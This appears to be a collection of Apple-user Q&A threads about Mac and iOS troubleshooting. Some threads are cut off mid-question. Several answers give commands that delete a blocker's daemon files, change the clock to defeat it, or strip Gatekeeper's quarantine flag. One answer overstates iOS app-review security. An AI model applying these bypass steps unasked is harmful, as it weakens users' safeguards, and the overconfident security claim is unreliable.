/Library/LaunchDaemons/org.eyebeam.selfcontrold.plist\nsudo rm /Library/PrivilegedHelperTools/org.eyebeam.selfcontrold\n\n\n\n*Remove the SelfControl hosts overrides\n\n*sudo vi /etc/hosts\n\n*Delete everything between # BEGIN SELFCONTROL BLOCK and # END SELFCONTROL BLOCK\n\n*Reboot your computer and you can now access your blocked websites\n\n\nA: If you're impatient about letting the clock run out, check your calendar and alerts for the next 24 hrs and jot down anything important during that time.\nquit SelfControl\nGo into System Preferences, date and time, and sign in your password to unlock. Advance the date one day, and relock everything. SC's timer goes strictly by the system clock.\nStart up SC again. You'll get timer at all zero's (SC thinks it's tomorrow [and so will everything else on your machine, which is why you want to check time-sensitive things beforehand] ) and likely a message 'stuck?' or something like that. un-stuck it. Now you'll get the standard timer selection. You can set it for the minimum--15 minutes--and let it run out again, to get a more graceful time-out. Now you can go into your blocklist and delete everything there, start it up again for 15 minutes and run it out. In fact I recommend you delete everything there, because selfcontrol can really crap your system, especially when you have other blocking elements (system security blocking, lulu, etc.) competing.\n( I wound up with Safari, Chrome, Skype blocked which I had nothing to do with, and were never in the blocklist (I checked the plist manually; there was nothing but n.c.h .c.o.m sites: I got SC specifically for stopping n.c.h apps from phoning home.) I couldn't wait 24 hours, Skype and a browser are an essential for me. )\nFrom there you can decide whether to delete SC altogether and be done with it. Wharton School absolutely recommends having nothing to do with it in the first place, and gives 5 very good reasons why.\n\nA: This is covered pretty clearly in the FAQ. Since the vendor has little help, do you have a backup of your Mac or can you make a backup so that if you need to erase and reinstall the OS, at least you have that option?\nhttps://github.com/SelfControlApp/selfcontrol/wiki/FAQ\n\nQ: How do I disable SelfControl once it has started?\nYou can't. That's the idea. Just wait.\n\"But, but but...\" you say.\nSeriously, chill out. It's not the end of the world.\nThe timer will run out and the internet will come back again. In the meantime, you may find comfort in curling up in a ball under your desk and rocking back and forth for a while.\nQ: I deleted the application, will that do anything?\nNo. (Except maybe cause problems with the block disappearing at the proper time. Don't do it!)\nQ: I did some stuff with the terminal that I read on a cool tech site, but it didn't work, what do I do now?\nWe don't know what you did or why you would follow instructions found on the internet before reading this FAQ. Lesson learned right? Good luck!\n\nSo for the good luck part, the most helpful advice would be to reinstall the latest version of the app (or the current version you installed if you still have the installer) - downloading it from another computer if needed and hope that when the timer goes to 0 like the FAQ describes - you can then unblock things before trying to uninstall it once the block period has expired.\n", "Q: Ghost/phantom notifications and other sketchy things my girlfriend's phone started doing something strange recently – after Airdropping three photos from a slightly older iPad Air, the notification center has been acting strangely. Every time she opens it, an animation plays that looks like the back end of the animation of clearing all notifications – just a couple empty bubbles disappear upward. She did a hard reset, and noticed a white horizontal line on the screen appearing during the reset, which is also new. \nThe iPad is also acting up now, which is new. When I go to the Photos app and try to open the camera roll, it opens, scrolls automatically up to the top, then closes and goes back to the grid of albums. This happens both with an internet connection and without, and has never happened before. It also switched to the Find My iPad app on its own, which is a little freaky.\nThe iPad is not password-protected and hasn't been for a couple years, but the battery has been dead for at least a year – she only charged it back up yesterday and started using it today. We're concerned about malware somehow getting onto the iPad, and then from the iPad to the phone. Our wifi network is WPA2 password-protected, and as far as we know, neither of us has downloaded anything sketchy onto the phone or the iPad (or anything else). These issues haven't been happening on any of my Apple devices. Is there a chance something might have somehow gotten in? How do we fix it? Even if it's not dangerous, the notification thing is pretty annoying and I'd like to fix it for her.\nThanks in advance for the help. I used to be really good at spyware removal and such up until a few years ago, but my knowledge has atrophied since then and I'm pretty much useless now.\n\nA: This sounds like a failure of the digitizer. All sorts of phantom scrolls and clicks can happen when the hardware thinks it's detecting fingers making tap and scroll motions at random or repetitively.\nIf you open the calculator app, sometimes you can map out what parts of the screen are failing, but depending on the severity it may come and go in relation to percent of charge and temperature.\nLong term, this is likely to get worse and need a repair - especially if the phone has been dropped and suffered either internal damage (which can be 100% invisible - especially if you have a case protecting) or can be totally unrelated to any damage - just that the fine wires in the display have stopped working as designed.\n", "Q: Where does Gatekeeper/XProtect log to? Where do GateKeeper and/or its XProtect component log to? I may have to meet a compliance regulation that requires tracking the logs of anti-virus running on my Mac, and wanted to know if there was a specific location, or if it was configurable in some way.\n\nA: Most components of macOS since Sierra use Unified Logging. This means there's not a separate file for writing logs, but rather logs are kept for as long as needed in memory and only important logs (e.g. errors) are written to disk in the unified system.log (which is also rotated frequently).\nIf you want to see messages as they go through the logs, you can use Console.app and filter by keywords you're interested in, but most of the log messages you see are unlikely to be persistently stored anywhere.\nMetadata about Gatekeeper (e.g. files checked) and XProtect (e.g. when the definitions were last updated) are kept, not in logs, but in the relevant preferences and bundles the app uses to get data from. It doesn't appear that this meets your full requirement of keeping logs of actions.\n", "Q: Native way to speed up/remove desktop switching animations I want a native (and therefore free) way to speed up a specific animation.

Since all MacBooks with Apple-SSDs have TRIM enabled, I was wondering if trimming would “reset/prepare” the blocks for new writes, or would they leave the blocks there until a new write comes in. \nIf blocks are reset/prepared in advance of new writes, would forensic recoverability of data still be possible?\n\nA: MacOS issues the TRIM command to the disk drive controller. From that point on the operating system have no control over the process. What happens is entirely drive dependent.\nThe most common is that the blocks are marked as unused in a bitmap in the drive, but the contents are otherwise left alone. In order to prevent the possibility of forensics, you’ll need to send a secure erase command instead.\nDepending on the drive, that will typically either erase the blocks or throw away an encryption key - or possibly both (typically on Intel drives). The end result is making it impossible to retrieve the data that was previously stored in those blocks.\n", "Q: Xcode from App Store Stalling at About 11 Minutes Remaining I'm trying to install Xcode from the App Store onto a Mac mini (the vast majority of my experience with PCs involves Windows and Linux). I've tried three times, and each time it stalls out at around 11 minutes remaining.\nWhat could be causing this problem? This is a refurbished Mac mini, with the latest version of Sierra installed, and very little else.\nIs there another way to download and install the software?\n\nA: The Xcode install takes an unusually long time even on a modern system, and the time estimates are often inaccurate. Just leave it be for a while -- it may take as long as a few hours.\nInstalling an SSD in the Mini will help significantly.\n\nA: Sounds like it could be the drive as well. Examine for errors and perhaps use drive recovery software to rebuild it. DiskWarrior or SpinRite for example. More than likely should update the drive regardless.\n", "Q: MacOS calendar notifications I'm synchronizing my google calendar with macOS and therefore getting holidays in my country which are annoying since I'm alerted about each.\nI've unchecked checkbox \"Holidays in country\", but nonetheless still getting alerts. How could I get rid off these events from calendar? These are not shown in calendar but I get informed about each the day before. On iPhone unchecking corresponding checkbox has helped me but not on the macOS. What do I do?\n\nA: I don't know whether this would be the same for a Google Calendar, but for an Apple 'public' calendar, you can switch off alerts from the Info panel [right click the calendar on the left]\n\n", "Q: Reset display brightness to factory defaults A family member played with the display resolution and brightness settings. Fixing the resolution was easy, but it seems there's no way to restore default brightness. It's not a big deal (I just selected a brightness which is ok for me now) but I was wondering if in High Sierra there's a way to restore all the display settings to the factory defaults.\nPS I'd prefer a solution which doesn't force me to reset all System Preferences to their factory defaults, just the display ones.\nmacOS High Sierra 10.13.5, MacBook Pro (15-inch, 2017)\n\nA: Default brightness is just ‘Automatically adjust brightness’ enabled.

The\n  SCSI Architecture Model family allows only one logical unit driver to\n  control a device at a time and provides in-kernel logical unit drivers\n  for storage devices (as listed in SCSI Architecture Model Family\n  Device Support). Similarly, the ATA family does not allow applications\n  to send ATA commands directly to ATA or SATA (Serial ATA) devices.\n\nWhat this means is that there's no built-in or 3rd party utility that will allow you to query the device directly (with the exception of SMART status values).\nIt may be possible in other OSes (Windows, Linux, or BSD) but Apple, by design, doesn't allow you to get this info.

And your system will always run hotter when you are using Windows in Bootcamp... I don't know all of the reasons for this, but it's just \"the way it's always been\" on my Macs. \nAs for your questions, \"I was wondering if this kind of stuff is normal. I'm worried if this is overheating and it might compromise the life of the Macbook for which i have spend a lot of money on.\": \nIt's a well-known fact that heat adversely affects the life of electronics. But again, for the temperatures you've recorded, I wouldn't worry. You may find that when Windows 10 performs some compute-intensive tasks that the temperature goes a bit higher. Apple has some guidelines on temperature management. And here's a Q&A that provides additional information.\n\nA: After almost 8 years of wondering why Mac computers (e.g. 2013 and 2020 Macbook Pro for my part) were overheating so much (reaching 100°C on both models when fully stressed) with Windows (installed with or without bootcamp), I finally discovered why thanks to your hint @Techno:\nMy guess is that Mac motherboards do not handle the turbo boost mode of modern CPUs. It is probably handled directly within MacOS, therefore Windows is lost and keeps using 100% of the maximum possible CPU frequencies. But the CPU turbo boost mode should be used only for very short periods of time, not all the time like it does here.\nTHE FIX\nOn Windows OS, go to the Advanced Power Options, and then under \"Processor Power Managment\":\n\n*\n\n*first set \"System Cooling Policy\" on ACTIVE for both Battery and Plugged in (by default set on PASSIVE on Battery, but it seems wrong except if you lower the \"Maximum Processor State\" a lot (maybe like 50%).\n\n*then set the \"Maximum Processor State\" at 99% for both Plugged in and Battery (lower on Battery if you want to save it). That's it!\n\nIf you open HWMonitor while doing this, you will notice that your CPU frequencies drop directly to the normal frequencies of your CPU (e.g almost always at 3000 MHz before = turbo boost frequencies, and at 1995 MHz after the fix). If you go lower than 99% you will notice that the frequencies change with normal ratios.\nThe downside of this is that we loose the turbo boost option of our CPUs, but in my opinion it is better than having the fans always running at their maximum, and damaging your hardware (CPU, but also the motherboard itself when it reachs 100°C!)\nCheers!\n", "Q: Remove Startup Arduino CreateAgent on High Sierra Recently this application was installed on my Mac.\nNow it runs every startup.

I deleted the Readdle Documents app by mistake and I had some files in it I would like back. I would prefer free or open source tools if possible. I am using Windows 10.\n(I don’t believe this is possible in iTunes. I tried iMacTools’ iBackup Viewer, and it only extracted what seemed to be placeholders for my files. (See answer below.))\n\nA: It turns out that the files stored in Readdle Documents are not stored in the normal location where apps store their Documents and Data.

When I first set it up, all applications were downloaded/installed using the Admin user.\nWhen using my Mac as the Standard user, every time I go to run an application I get the following message:\n\"Whatever.app\" is an application downloaded from the Internet.\nAre you sure you want to open it?\n\nWith the options for Cancel and Open. Of course I choose Open and everything works fine.\nNow, I am used to this notice appearing the first time I try to run an app from the internet. My problem is that it appears every time.\nNote that I am not asked for any Administrator credentials, and these apps have already been installed to the /Applications directory as an Administrator.\nI have tried with a different Standard user and still have the same issue. I have also already used Disk Utility to repair the drive permissions, just in case.\nHow can I make this notice appear only on the first run?\n==========================================================\nMore details:\nIf I install an application, while logged in as the Standard user, but authenticating as the Administrator, then it only warns me about the Application on the first run, and then never again, as long as I am still logged in as that Standard user.\nBut all the applications I installed while logged in as Administrator give me a pop up warning every time if I try to run them while logged in as a Standard user. \nThere is a \"solution\" to this problem, but it is so incredibly inelegant. For every application I downloaded and installed, while logged in as Administrator, simply installing the application is not enough. I must actually login as the Administrator and launch the application at least once to clear the warning for all other users. This seems incredible silly. Surely there must be a better way to accomplish this? \n\nA: The basic problem is that the applications are all marked as being in quarantine (they have the \"com.apple.quarantine\" extended attribute) because they were downloaded from the net. Running the app removes the quarantine attribute if the file permissions allow you to modify the file (e.g. if you're the file's owner -- in this case, the Admin user). If you don't have permission, the quarantine attribute stays, and you keep getting the \"downloaded from the Internet\" message over and over.\nSolution: one way or another, you need to remove that quarantine attribute. You can do this for a bunch of apps at once in Terminal.\n\n\n*\n\n*First use su (switch user) to switch to your admin user (type in \"su\", then a space, then the account name of your admin user, then press return and enter the admin account's password; note that the password won't be displayed as you type). It should look something like this:\nDans-Mac:~ dan$ su adminacct\nPassword:\nbash-3.2$\n\n\n*If that works, type in \"xattr -r -d com.apple.quarantine\", then a space, then drag all the apps you want to dequarantine from the Finder to the Terminal window; when they're all listed, press return. Note that you can drag them one at a time or in groups, whatever's convenient. Something like this:\nbash-3.2$ xattr -r -d com.apple.quarantine /Applications/BBEdit.app /Applications/Firefox.app\n\n\nA: Gordon Davisson's answer worked for me, but for whatever reason, my Applications folder was showing as empty in Finder and with ls . So to get the path/name for the application I wanted to clear, I had to use \nsudo find / -iname *.app \nto get paths for all installed apps (as found on https://www.howtogeek.com/409377/how-to-list-all-applications-on-a-mac/).\n", "Q: Can an iOS application access SMS messages? I've read some articles that tend to say that app store downloaded apps on a non-jailbroken iPhone can't read SMS messages, which seems to be confirmed by the fact there's no \"messages access\" category under settings>privacy.\nHowever, I remember that some apps sending OTP through SMS can automatically detect reception of the SMS and pull the OTP without intervention. There are also some apps that claim they can spy on a phone text messages.\nSo I have a doubt, and I would appreciate your input on this.\n\nA: It is nearly impossible for this to occur because Apple has next level security, as well as they scan apps before they are placed on the AppStore! They specifically scan for malware and security breaches, like this one!! All iPhones are extremely secure and if an app can access your messages (which I don’t think it can) they would be breaching the Apple Privacy Policy along with some other Terms and Conditions! Highly unlikely, but good question.\n\nA: \nHowever, I remember that some apps sending OTP through sms can automatically detect reception of the SMS and pull the OTP without intervention.\n\nYes, that functionality is specifically available for one-time codes. Here is the documentation: if your app has a text box and you configure it like this, it will be automatically populated. iOS has no way to verify whether the app and the SMS are related to each other, but it's rather uncommon for a user to start another app in the mean time with that functionality, and since these codes are short lived, the security risk is minimal.\n", "Q: Create script to disallow using Mac at night? I want to stop watching too much pornography at night. It'd be useful if I were to create a script to automatically turn off my Mac at 11:00 PM and keep it turned off until 7:00 AM. If I power the computer on at any time between 11 o'clock and 7 o'clock, it should immediately shut itself down again. I also want disabling the script to be difficult to prevent myself from easily bypassing it to watch porn. How do I create this program?\n\nA: One other possibility is, if you want to continue using your administrator account, is Focus app. After setting it up, you can give the password to unlock it to a trusted person and then restrict your account usage during the hours you don't want to use your computer.\nOf course, this is no substitute for having the willpower to prevent yourself from using your computer when you would not like to. If you are creative enough, there will be a way to bypass these restrictions. However, this app is a reasonable step to take if you think that you a slightly stronger method of prevention from using your computer.\nNote: Focus comes with a free trial and costs $20 for a single license. There are other apps which provide similar services, some of which may provide your desired functionality for free. Focus app is simply the app which I am the most familiar with and have sufficient confidence in, so I am suggesting it here.\n\nA: This is what Parental Controls can be used  for.\nYou can set the times where you can and cannot use the computer.  The caveat is that you cannot be an Admin so you will need to give the reins of control over to a trusted person.\nThat said, Parental Controls is just one avenue and you cannot rely on tech to address an issue like this.\n\nI say this with the utmost sincerity and with nothing else than the stated goal of seeing you helped: \nThis is symptomatic of an addictive behavioral disorder and can be something that is very difficult to overcome.  In addition to the tech blocks, I highly suggest you seek out a licensed therapist.\n", "Q: MBP connects to WiFi but not to internet This happens periodically, but I still don’t know why....very frustrating.\n2011 MacBook Pro, High Sierra 10.13.5. 10 other devices in the house using WiFi no problem, between Galaxy S9, 3 iPads, an HP laptop and numerous smart TVs.... this has happened at home as well as on the road and I know that it is my MBP, but usually I manage to fix it- not this time.

When everything is configured like normal, i.e. IPv4 using DHCP and IPv6 configured automatically, I do not have a self-assigned IP address, but it does show me having an IPv6 address, which is weird and don’t recall seeing that before, usually it is an IPv4 address. When I get my IP address in terminal, it is not a class C, starting in 192, but rather a class B starting with 169 and the subnet mask is then 255.255.0.0, which I never see.  \nI also cannot boot into Safe mode for some reason.

Just as in UNIX based system the init process is the parent of all the processes and similarly, the zygote process in Android OS has the sole purpose of launching other processes.\n\nWhat is the name of the iOS equivalent process?\n\nA: The name of the equivalent process on iOS and macOS is launchd.\nIt is run with PID 1 and it the parent of all other running user-space processes. The objective of launchd is similar to initd - having the responsibility of launching other processes during boot and various other phases of the system lifetime.\nThis is in thread with traditional Unix-based systems, where PID 1 is reserved for the process that is responsible for launching the user space part of the system. This was traditionally initd, but on modern systems that is often replaced with alternatives such as launchd (on macOS), systemd, upstart, and other init systems.\n", "Q: AppleScript to Option-click on the Dropbox Menu Bar Icon I have an AppleScript that does a simple \"mouse\" click on the Dropbox menu bar icon (Menu Extra or Menulet).

I woke up to discover Handbrake stopped sometime after I walked away from it last night, only to continue transcoding again after I logged back into my Mac this morning.\nWhy in the world did it put itself to sleep when it was so clearly busy? All 12 cores of the processor were going to town! How do I ensure my Mac Pro does NOT go to sleep, especially when it should be working hard?\nTechnical details, if needed:\nMac Pro 2013 (trash can edition)\n12-Core Processor\n64GB RAM\n1TB SSD\nmacOS High Sierra 10.13.5\n\nA: Had this issue with a server computer. The only reliable (I have used this for 6 months+ without a single issue) native solution I found was by using the caffeinate command.\nThe command I use to prevent sleep is caffeinate -s.  You can add a time limit with the -t [# of seconds] flag but since you want it never to go to sleep you don't need it. \nHeres the man page: \nCAFFEINATE(8)             BSD System Manager's Manual            CAFFEINATE(8)\n\nNAME\n     caffeinate -- prevent the system from sleeping on behalf of a utility\n\nSYNOPSIS\n     caffeinate [-disu] [-t timeout] [-w pid] [utility arguments...]\n\nDESCRIPTION\n     caffeinate creates assertions to alter system sleep behavior.  If no\n     assertion flags are specified, caffeinate creates an assertion to prevent\n     idle sleep.  If a utility is specified, caffeinate creates the assertions\n     on the utility's behalf, and those assertions will persist for the dura-\n     tion of the utility's execution. Otherwise, caffeinate creates the asser-\n     tions directly, and those assertions will persist until caffeinate exits.\n\n     Available options:\n\n     -d      Create an assertion to prevent the display from sleeping.\n\n     -i      Create an assertion to prevent the system from idle sleeping.\n\n     -m      Create an assertion to prevent the disk from idle sleeping.\n\n\n     -s      Create an assertion to prevent the system from sleeping. This\n             assertion is valid only when system is running on AC power.\n\n     -u      Create an assertion to declare that user is active. If the dis-\n             play is off, this option turns the display on and prevents the\n             display from going into idle sleep. If a timeout is not specified\n             with '-t' option, then this assertion is taken with a default of\n             5 second timeout.\n\n     -t      Specifies the timeout value in seconds for which this assertion\n             has to be valid. The assertion is dropped after the specified\n             timeout. Timeout value is not used when an utility is invoked\n             with this command.\n\n     -w      Waits for the process with the specified pid to exit. Once the\n             the process exits, the assertion is also released.  This option\n             is ignored when used with utility option.\n\nEXAMPLE\n     caffeinate -i make\n:\n\n\nA: caffeinate is your friend. Open a terminal \"window\", type man caffeinate and read it. The options allow you to use caffeinate in a general, or a selective way. For example, assuming the Handbrake PID is 123:\n\ncaffeinate -w 123 \n\nThis command will create an assertion that keeps your Mac working as long as Handbrake is running, and then releases it, allowing your Mac to go to sleep. \nIf you have further questions, please let us know.\nEDIT:\nNote that caffeinate will NOT prevent an automatic logout. Check to make sure you have not selected that option; caffeinate is powerless against a logout. \n\nA: Try unchecking Prevent computer from sleeping automatically when the display is off. Now close System Preferences. Then go back in and check that checkbox back on.\nI’ve had instances where what was displayed in System Preferences didn’t match what was actually set. Changing one setting should cause macOS to reapply your preferences.\n", "Q: Is it possible to wake a machine from ARD? Is it possible to wake a machine from ARD ? I have issues sometimes connecting to machines if they are in sleepmode and sometimes have to walk over to the machines and manually take them out of sleep mode before i can connect with ARD ? \n\nA: Your network needs to be able to send WOL (wake-on-LAN) packets to the machines affected. If your network is subnetted, the problem becomes more difficult, if not impossible, without router config magic. This thread at Apple Communities explains the details more succinctly, and offers some solutions.\nWhen I was managing 300+ Macs on two campuses more than a decade ago, it was impossible to wake any Macs from sleep reliably with ARD, so I set the Macs to spin down the hard drives when not in use and set the monitor sleep to a relatively short duration. The Macs never slept during the school day, and to save power, I used pmset commands to turn the Macs off after the close of the school day, and start up before school started on the morning. Naturally, people being who they are, some folks would power-down manually when they were done, but there was nothing I could do about it.\nWe now use JAMF JSS to manage our Mac fleet, which is thin on desktops -- laptops are the machine of choice. ARD has fallen by the wayside. I loved using it, but I'm no longer doing any serious Mac administration.\n", "Q: Fullscreen issue I've got a MacBook Air (early 2015) and time to time I have a problem with fullscreen mode. When controls disappear (cursor as well) video may become darker or change the saturation. I'm not sure what to do with this. I'm using Safari and that problem appears on YouTube.\nIf I try to watch Twitch in fullscreen it's always a painful process because that problem appears almost every time regardless of what browser I'm using.\nAlso some videos get angled in fullscreen mode on YouTube (usually these are about 4:3 screen aspect ratio)\n\nA: Depending on the darkness of the room the Macbook Air is being used in, it may also change the brightness of the screen because the light sensor (the small gray dot to the left of the camera) is set by Apple to adjust the brightness of the screen depending on the darkness of the room. For example, if you are using your Mac at night with dim lights on, generally, the screen will darken. The darkness can be changed manually during this process with F1 and F2 (the brightness buttons)\n", "Q: How to tell the keyboard layout from the box? I have a brand new Apple wired keyboard (someone gave it to me for free). I want to sell it on eBay.

This is true for the barcode as well. The number starting with 4R produces no results.\nEdit: two more pictures\n\n[\n\nA: It is a British layout. I found this out by googling 'MB110' while restricting the results to different countries and looking for model numbers that pop up.\nExamples:\nMB110B/A and MB110B/B are British layouts\nMB110D/B is German\nMB110RS/B is Russian\netc.\n", "Q: Why does Safari frequently log me out of websites? Recently, Safari started to act differently and to bounce me out from websites such as Gmail, so I need to login after reboot or long sleep etc. \nWhy is this happening? How do I make Safari \"remember\" I'm logged in?\n\nA: This seems to be a common issue (which I also experience). I know that Safari is particular with how it handles cookies, which is a likely cause. I'm assuming this is on Apple's radar.\nI have some suspicion that it's because I have website tracking completely off, but never tested it fully as I prefer to have it off.\nAs a temporary fix, the use of a password manager (iCloud Keychain is built into Apple devices) makes the login process faster.\n", "Q: My keyboard on MacBook got stuck - do Apple Stores fix it without Apple Care? The delete key on my MacBook (mid-2017 12' model) seems to have got stuck and often it won't respond to my pushing on the key. \nSo I temporarily swapped the delete key for the backslash but I rather want to fix it. But I find it is incredibly hard to fix it on my own, so I consider bringing it to the Apple Store.\nBut my MacBook is neither covered by the Apple Care program nor was purchased in a country where I'm in now. Is it possible to fix it up at the Apple Store and does the fix of the stuck keyboard get me charged (if so, approximately how much)? \n\nA: It doesn't matter where you live. Apple Care covers your computer no matter what. If you just recently bought the computer in-between July 8th of this year and last year then you can get the key repaired for free. \nIf not, then try to find a repair service near you via this link. Apple has licensed resellers all over the world and most of them also do repairs. If your computer is badly damaged, they are going to send it in to get it repaired and you may end up paying a whole lot of money and you won't have your laptop for several weeks.\nAlternatively, you could try to fix it yourself. This is highly risky if you don't know what your doing and you could end up permanently damaging the computer. I don't know what model your laptop is, but if it is 2016 or newer, it has the butterfly 2 mechanism in the keyboard. I know from personal experience that this style of keyboard tends to get stuck really easily when dust and grit get underneath the keys. I just blow it out and that has worked every time.\nIf your laptop is 2015 or older, you have the butterfly 1 mechanism. If your key is stuck it could be legitimately damaged. I would recommend at least trying to blow it out with some high-powered air. If that doesn't work you will need to take it to someone to get repaired.\n\nA: I just went to the Apple Store and got my MacBook repaired. The staff checked the key and found that the inside of the key was cracked, and also the wire that fixed the key was crooked. He replaced it with a new key, and then blowed all the other keys as well as wiping them off. It was free of charge, but took 4 hours to get repaired...\nThey did not ask where I purchased it, FIY. \n", "Q: Homebrew asked me to move macports now it does not work I'm using HomeBrew for my usual mac stuff but I need to do some experiments with other package managers. So I installed MacPorts. everything seems alright but brew doctor asks me to move it:\n\nwarning: You have MacPorts or Fink installed:\nThis can cause trouble. You don't have to uninstall them, but you may want to \ntemporarily move them out of the way, e.g. sudo mv /opt/local ~/macports\n\nSo I listened and moved it. And then in my bash profile I changed \nexport PATH=\"/opt/local/bin:/opt/local/sbin:$PATH\"\nto \nexport PATH=\"~/macports/bin:~/macports/sbin:$PATH\"\nand now when I when run port ... it gives me this error:\n\n-bash: /Users/foobar/macports/bin/port: /opt/local/libexec/macports/bin/tclsh8.5: bad interpreter: No such file or directory\n\nWhat am I doing wrong and how can I solve it?\nP.S.1. \nI edited the /Users/foobar/macports/bin/port file as the admin and edited the first line from \n#!/opt/local/libexec/macports/bin/tclsh8.5\nto\n#!/Users/foobar/macports/libexec/macports/bin/tclsh8.5\nnow I get this new error:\n\nsources_conf must be set in /opt/local/etc/macports/macports.conf or in your /Users/foobar/.macports/macports.conf file\n      while executing\n  \"mportinit ui_options global_options global_variations\"\n  Error: /Users/foobar/macports/bin/port: Failed to initialize MacPorts, sources_conf must be set in /opt/local/etc/macports/macports.conf or in your /Users/foobar/.macports/macports.conf file\n\nP.S.2. \nchanged all the /opt/locals to ~/macportss in \n/Users/foobar/macports/var/macports/sources/rsync.macports.org/macports/release/tarballs/ports/_ci/bootstrap.sh \nand \n/Users/foobar/macports/etc/macports/macports.conf\nnothing changed!\nP.S.3.\nI see some of the guys here try to guid me towards removing/uninstalling MacPorts or HomeBrew. That's not what I'm asking for. I am able to revert all I did and make the MacPorts work again (in fact I just did that). My question is why HomeBrew Is saying that? what I happens If I don't do what it is asking for? What if I want the MacPorts too? and most importantly how make the MacPorts keep working after moving?\n\nA: Disentangling messed up dot files and environment variables and paths might be a lot of work if you didn’t follow the recommended steps precisely or made subsequent changes. What about making a list of the homebrew packages you have (if any) then removing it entirely. Same with macports - don’t try to adapt it to run in a new place - remove it entirely after you know what packages you need.\nThen make a brand new user account - install homebrew there cleanly with a default path and having cleaned up /opt before you made the new account.\nThis will quickly let you know if you have a system problem or it’s just the weight of all the changes made to get the previous software to run.\nThe alternative to this will be a lot of back and forth and you dumping a ton of data into the question or arranging remote access with someone skilled in picking apart bash/scripting errors and digging into the code and what brew doctor has to say about your setup that’s broken.\n\nA: -bash: /Users/foobar/macports/bin/port: /opt/local/libexec/macports/bin/tclsh8.5: bad interpreter: No such file or directory\n\nThat's your problem right there. While you moved macports, and updated your path, you did not also change all the internal references to the original path.\nI looked in that file and found a reference to:\n/opt/local/libexec/macports/lib/libtcl8.5.dylib\n\nIn general, any unix package larger than a single file can NOT be moved to any random location in the filesystem. It will WORK from any random location but only if you build it there. \nWhen you installed the first program that used the tcl library it got compiled/linked to the full path of that library, along with stuff in /usr/lib and more stuff in /System/Library/Frameworks. Move any of those and a lot of stuff won't run anymore.\nSo, your choices are:\n\n\n*\n\n*Move MacPorts and reinstall everything\n\n*Move homebrew and reinstall everything\n\n\nWhy did homebrew break macports? They wanted to use the same path, something was already there, and it's not their job to deal with someone else's process.\nThey should have done 10 seconds more research and found a better way, like a non-conflicting path.\n\nA: Navigate to the directory /Users/foobar/macports/var/macports/registry :\ncd /Users/foobar/macports/var/macports/registry\n\nNow query the registry database for installed programs and create a file with all your macports installed programs on your desktop.\nsqlite3 registry.db 'select name, requested from ports' | cut -d'|' -f1 > ~/Desktop/macports.txt\n\nNow remove /Users/foobar/macports then follow the uninstall instructions in the MacPorts guide. At this point decide whether to reinstall MacPorts and remove HomeBrew or just use HomeBrew.\n", "Q: Mid 2007 20\" iMac — Faint vertical lines on display, is this a serious problem?

The vertical lines are most visible in the black space on the bottom right. \n\n The lines in the white space are something my camera picked up, not a problem.\nIs there any way to stress test this and determine the stability and/or seriousness of these artifacts?\n\nA: I wouldn’t be concerned you could use the Mac for a week and then note for yourself if the situation is stable or if you want to start saving money to get it repaired.  We have machines like that that we use for timeclocks of people punching in/out - they’ve  been stable for years with graphics glitches similar to that. \nKeep toying around and figuring out how you can make the best use of this regift it would be my advice. I wouldn’t spend any money repairing it.  Save your budget so you could buy a new display if you actually need one.

I am hoping this is not a sign of my laptop malfunctioning or having been hacked. Any insight is appreciated!\n\nA: I get that all the time when I download a file from Europe when the time zone differences are not corrected. Dates can be set far in the past and far in the future with simple commands like touch and the finder just reports the metadata / date stored in the files in question.\nNo real mystery or worry unless you are in some way trusting a file’s date for processing or record keeping. In that case, you’ll need to audit for the correct times and catch things that show up with non-sensical dates or dates off from the current time by some deviation you set.\n", "Q: How to tell which resolution my iTunes movie is playing at? For Apple TV 4K, if an iTunes movie has 4K available, but possibly due to my other Internet usage, the speed required (25Mbps recommended) is or is not possible.  Then how can I tell which resolution the movie is playing at currently? (whether it is playing at 4K or not).\n\nA: When the iTunes movie is playing, drag down from the top of the remote to the bottom of the touch area. This will show the info panel from the AppleTV with information about the movie.\nAt the top you'll see small icons representing the currently played quality. For example \"HD\", \"4K\" or \"SD\". It might also display \"HDR\" and similar.\nFor the frequency, the best way is to check the TVs \"Info\" panel (or whatever it is called on your TV). This will show the resolution and frequency that the AppleTV is currently playing at. When you have frequency matching enabled (which is the default) this will match the source frequency of the movie.\nNote: This method is not suitable for determining resolution when playing back from for example YouTube where content might be 240p or similar low resolutions. In those cases look at what the Youtube app tells you.\n", "Q: How do I tell my Apple TV 4K to retry for using 4K as a default? When I set up the Apple TV 4K, it was possible that the Internet speed was slower than usual, and Apple TV 4K said it is not possible to play at 4K for the iTunes movies that I purchased.  \nBut what if I stop all other Internet connections, and want Apple TV 4K to re-try to see whether it can use 4K as a default (or that I don't mind the movie being choppy once in a while), how can that be done?\n\nA: The Apple TV estimates bandwidth available every time you play a movie - so it is done automatically. There's no need to rerun the setup process whenever the load on your internet connection changes.\n", "Q: How to find the corresponding configuration files of php?

It's like couple of lines of pixels missing completely or moved one pixel up. \nThe Wifi icon in the menu bar shows this glitch when it's alone, but draws properly when we select it. The clearest images go this are finder sidebar  icons (AirDrop, Documents etc) and menu bar icons (wifi, battery etc). \n\n\n\nSome things to note:\n\n\n*\n\n*We installed vanilla High Sierra and it still shows up.\n\n*Booted to Recovery Mode everything looks fine.\n\n\nWhat might cause this so we can fix it or simply know the cause?\n\nA: This is absolutely sounding like a graphics card issue (VRAM failure or part of the accelerated graphics pipelines have failed within the GPU itself). My thinking is that when you boot to recovery or safe mode, the graphics driver is operated in a very slow and limited manner (likely deactivating shader and vector processing optimizations, etc...). When that cures glitches you’ve got a very few things to consider now.\nYou've already installed a totally new copy of the OS so unless you didn't apply all updates to that OS - you've brought the latest drivers, no corrupt apps or add-on or user settings and proved the current OS and hardware fail to work. Excellent triage there to be sure it’s not software corruption or a preference issue.\nSince Apple repairs MacBook by swapping in a new logic board - you would expect a $300 flat rate repair to fix this out of warranty but get a quote from them to be sure. Before spending money to fix, I'd probably be sure a safe mode boot confirms it's GPU related and be sure you have a good backup.\nI dismiss it being the LCD or the connecting cable (but it could be either as well - even just the connecting cables are loose) since most of the time, that would cause lines no matter what was drawn and your WiFi icon curing itself on screen when the image changes makes me think the computer is generating the wrong image and the wrong image is being faithfully displayed as opposed to a good image from the GPU being corrupted by the cables and/or display.\nShort term, you could increase the size of the elements to minimize the pain to see things or try using an external screen when you can. \n", "Q: Does Lightning to 3.5 mm support High-Res headphones? Since iPhone 7, Apple has switched to Lightning port and provides a dongle for 3.5 mm jack. Does this dongle support High-Res (16/24 bit) headphones/earphones?\n\nA: High resolution headphones work with the same analog signal as ordinary head phones. High resolution headphones “just” have to be compliant with some quality requirements for the head phones themselves. There’s no guarantee that 